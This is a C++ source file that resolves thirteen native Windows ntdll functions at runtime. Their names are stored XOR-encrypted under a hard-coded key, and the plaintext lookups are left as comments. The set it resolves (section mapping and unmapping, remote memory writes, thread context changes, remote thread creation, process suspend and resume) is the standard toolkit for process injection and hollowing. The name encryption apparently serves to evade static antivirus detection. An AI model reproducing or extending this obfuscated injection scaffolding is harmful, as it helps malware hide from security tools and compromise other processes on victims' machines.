#include "pch.h"
#include "hkutil.h"
#include "hkfunc.h"

// 11111011 11100100 00111000 11000010 01100100 11010011 01111101 11011101
constexpr uint64_t encryptionKey = 18150694805776334301u;

constexpr uint8_t NtAllocateVirtualMemory_ENCRYPTED[] = { 0x93, 0x09, 0x92, 0x08, 0xAE, 0x57, 0x87, 0x9A, 0xA9, 0x18, 0x85, 0x0D, 0xB0, 0x4C, 0x91, 0x9A, 0xB1, 0x30, 0xB6, 0x09, 0xAD, 0x4A, 0x9D };
constexpr uint8_t NtCreateProcess_ENCRYPTED[] = { 0x93, 0x09, 0x90, 0x16, 0xA7, 0x59, 0x90, 0x9E, 0x8D, 0x0F, 0xBC, 0x07, 0xA7, 0x4B, 0x97 };
constexpr uint8_t NtCreateSection_ENCRYPTED[] = { 0x93, 0x09, 0x90, 0x16, 0xA7, 0x59, 0x90, 0x9E, 0x8E, 0x18, 0xB0, 0x10, 0xAB, 0x57, 0x8A };
constexpr uint8_t NtCreateThreadEx_ENCRYPTED[] = { 0x93, 0x09, 0x90, 0x16, 0xA7, 0x59, 0x90, 0x9E, 0x89, 0x15, 0xA1, 0x01, 0xA3, 0x5C, 0xA1, 0x83 };
constexpr uint8_t RtlCreateUserThread_ENCRYPTED[] = { 0x8F, 0x09, 0xBF, 0x27, 0xB0, 0x5D, 0x85, 0x8F, 0xB8, 0x28, 0xA0, 0x01, 0xB0, 0x6C, 0x8C, 0x89, 0xB8, 0x1C, 0xB7 };
constexpr uint8_t NtGetContextThread_ENCRYPTED[] = { 0x93, 0x09, 0x94, 0x01, 0xB6, 0x7B, 0x8B, 0x95, 0xA9, 0x18, 0xAB, 0x10, 0x96, 0x50, 0x96, 0x9E, 0xBC, 0x19 };
constexpr uint8_t NtMapViewOfSection_ENCRYPTED[] = { 0x93, 0x09, 0x9E, 0x05, 0xB2, 0x6E, 0x8D, 0x9E, 0xAA, 0x32, 0xB5, 0x37, 0xA7, 0x5B, 0x90, 0x92, 0xB2, 0x13 };
constexpr uint8_t NtQueryInformationProcess_ENCRYPTED[] = { 0x93, 0x09, 0x82, 0x11, 0xA7, 0x4A, 0x9D, 0xB2, 0xB3, 0x1B, 0xBC, 0x16, 0xAF, 0x59, 0x90, 0x92, 0xB2, 0x13, 0x83, 0x16, 0xAD, 0x5B, 0x81, 0x88, 0xAE };
constexpr uint8_t NtResumeProcess_ENCRYPTED[] = { 0x93, 0x09, 0x81, 0x01, 0xB1, 0x4D, 0x89, 0x9E, 0x8D, 0x0F, 0xBC, 0x07, 0xA7, 0x4B, 0x97 };
constexpr uint8_t NtSetContextThread_ENCRYPTED[] = { 0x93, 0x09, 0x80, 0x01, 0xB6, 0x7B, 0x8B, 0x95, 0xA9, 0x18, 0xAB, 0x10, 0x96, 0x50, 0x96, 0x9E, 0xBC, 0x19 };
constexpr uint8_t NtSuspendProcess_ENCRYPTED[] = { 0x93, 0x09, 0x80, 0x11, 0xB1, 0x48, 0x81, 0x95, 0xB9, 0x2D, 0xA1, 0x0B, 0xA1, 0x5D, 0x97, 0x88 };
constexpr uint8_t ZwUnmapViewOfSection_ENCRYPTED[] = { 0x87, 0x0A, 0x86, 0x0A, 0xAF, 0x59, 0x94, 0xAD, 0xB4, 0x18, 0xA4, 0x2B, 0xA4, 0x6B, 0x81, 0x98, 0xA9, 0x14, 0xBC, 0x0A };
constexpr uint8_t NtWriteVirtualMemory_ENCRYPTED[] = { 0x93, 0x09, 0x84, 0x16, 0xAB, 0x4C, 0x81, 0xAD, 0xB4, 0x0F, 0xA7, 0x11, 0xA3, 0x54, 0xA9, 0x9E, 0xB0, 0x12, 0xA1, 0x1D };

TAllocateVirtualMemory hkAllocateVirtualMemory = nullptr;
TCreateProcess hkCreateProcess = nullptr;
TCreateSection hkCreateSection = nullptr;
TCreateThreadEx hkCreateThreadEx = nullptr;
TCreateUserThread hkCreateUserThread = nullptr;
TGetContextThread hkGetContextThread = nullptr;
TMapViewOfSection hkMapViewOfSection = nullptr;
TQueryInformationProcess hkQueryInformationProcess = nullptr;
TResumeProcess hkResumeProcess = nullptr;
TSetContextThread hkSetContextThread = nullptr;
TSuspendProcess hkSuspendProcess = nullptr;
TUnmapViewOfSection hkUnmapViewOfSection = nullptr;
TWriteVirtualMemory hkWriteVirtualMemory = nullptr;

void initializeWinAPIFunctions() {
  //hkAllocateVirtualMemory = (TAllocateVirtualMemory)util::getFunctionAddress("ntdll", "NtAllocateVirtualMemory");
  hkAllocateVirtualMemory = (TAllocateVirtualMemory)util::getFunctionAddress("ntdll", decryptFunctionName(&NtAllocateVirtualMemory_ENCRYPTED[0], sizeof(NtAllocateVirtualMemory_ENCRYPTED)).c_str());
  //hkCreateProcess = (TCreateProcess)util::getFunctionAddress("ntdll", "NtCreateProcess");
  hkCreateProcess = (TCreateProcess)util::getFunctionAddress("ntdll", decryptFunctionName(&NtCreateProcess_ENCRYPTED[0], sizeof(NtCreateProcess_ENCRYPTED)).c_str());
  //hkCreateSection = (TCreateSection)util::getFunctionAddress("ntdll", "NtCreateSection");
  hkCreateSection = (TCreateSection)util::getFunctionAddress("ntdll", decryptFunctionName(&NtCreateSection_ENCRYPTED[0], sizeof(NtCreateSection_ENCRYPTED)).c_str());
  //hkCreateThreadEx = (TCreateThreadEx)util::getFunctionAddress("ntdll", "NtCreateThreadEx");
  hkCreateThreadEx = (TCreateThreadEx)util::getFunctionAddress("ntdll", decryptFunctionName(&NtCreateThreadEx_ENCRYPTED[0], sizeof(NtCreateThreadEx_ENCRYPTED)).c_str());
  //hkCreateUserThread = (TCreateUserThread)util::getFunctionAddress("ntdll", "RtlCreateUserThread");
  hkCreateUserThread = (TCreateUserThread)util::getFunctionAddress("ntdll", decryptFunctionName(&RtlCreateUserThread_ENCRYPTED[0], sizeof(RtlCreateUserThread_ENCRYPTED)).c_str());
  //hkGetContextThread = (TGetContextThread)util::getFunctionAddress("ntdll", "NtGetContextThread");
  hkGetContextThread = (TGetContextThread)util::getFunctionAddress("ntdll", decryptFunctionName(&NtGetContextThread_ENCRYPTED[0], sizeof(NtGetContextThread_ENCRYPTED)).c_str());
  //hkMapViewOfSection = (TMapViewOfSection)util::getFunctionAddress("ntdll", "NtMapViewOfSection");
  hkMapViewOfSection = (TMapViewOfSection)util::getFunctionAddress("ntdll", decryptFunctionName(&NtMapViewOfSection_ENCRYPTED[0], sizeof(NtMapViewOfSection_ENCRYPTED)).c_str());
  //hkQueryInformationProcess = (TQueryInformationProcess)util::getFunctionAddress("ntdll", "NtQueryInformationProcess");
  hkQueryInformationProcess = (TQueryInformationProcess)util::getFunctionAddress("ntdll", decryptFunctionName(&NtQueryInformationProcess_ENCRYPTED[0], sizeof(NtQueryInformationProcess_ENCRYPTED)).c_str());
  //hkResumeProcess = (TResumeProcess)util::getFunctionAddress("ntdll", "NtResumeProcess");
  hkResumeProcess = (TResumeProcess)util::getFunctionAddress("ntdll", decryptFunctionName(&NtResumeProcess_ENCRYPTED[0], sizeof(NtResumeProcess_ENCRYPTED)).c_str());
  //hkSetContextThread = (TSetContextThread)util::getFunctionAddress("ntdll", "NtSetContextThread");
  hkSetContextThread = (TSetContextThread)util::getFunctionAddress("ntdll", decryptFunctionName(&NtSetContextThread_ENCRYPTED[0], sizeof(NtSetContextThread_ENCRYPTED)).c_str());
  //hkSuspendProcess = (TSuspendProcess)util::getFunctionAddress("ntdll", "NtSuspendProcess");
  hkSuspendProcess = (TSuspendProcess)util::getFunctionAddress("ntdll", decryptFunctionName(&NtSuspendProcess_ENCRYPTED[0], sizeof(NtSuspendProcess_ENCRYPTED)).c_str());
  //hkUnmapViewOfSection = (TUnmapViewOfSection)util::getFunctionAddress("ntdll", "ZwUnmapViewOfSection");
  hkUnmapViewOfSection = (TUnmapViewOfSection)util::getFunctionAddress("ntdll", decryptFunctionName(&ZwUnmapViewOfSection_ENCRYPTED[0], sizeof(ZwUnmapViewOfSection_ENCRYPTED)).c_str());
  //hkWriteVirtualMemory = (TWriteVirtualMemory)util::getFunctionAddress("ntdll", "NtWriteVirtualMemory");
  hkWriteVirtualMemory = (TWriteVirtualMemory)util::getFunctionAddress("ntdll", decryptFunctionName(&NtWriteVirtualMemory_ENCRYPTED[0], sizeof(NtWriteVirtualMemory_ENCRYPTED)).c_str());
}

std::string decryptFunctionName(const uint8_t* inEncryptedArray, const size_t inArraySize) {
  std::string decryptedString;
  decryptedString.resize(inArraySize);
  const uint8_t* pEncryptionKey = (uint8_t*)&encryptionKey;

  for (size_t arrayIndex = 0; arrayIndex < inArraySize; ++arrayIndex) {
    decryptedString[arrayIndex] = inEncryptedArray[arrayIndex] ^ pEncryptionKey[arrayIndex % sizeof(encryptionKey)];
  }

  return decryptedString;
}